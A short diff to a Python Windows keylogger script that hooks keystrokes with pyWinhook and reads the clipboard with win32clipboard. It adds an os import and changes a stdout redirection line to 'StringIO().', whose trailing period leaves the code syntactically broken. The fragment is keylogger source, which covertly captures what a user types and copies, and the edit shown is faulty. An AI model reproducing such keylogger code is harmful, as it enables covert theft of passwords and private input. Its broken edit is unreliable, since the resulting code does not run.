@@ -6,6 +6,7 @@ from io import StringIO
 
 import pythoncom
 import pyWinhook as pyHook
+import os
 import sys
 import time
 import win32clipboard
@@ -58,7 +59,7 @@ def mykeystroke(self, event):
 
 def run():
   save_stdout = sys.stdout
-  sys.stdout = StringIO()
+  sys.stdout = StringIO().
 
   kl = KeyLogger()
   hm = pyHook.HookManager()
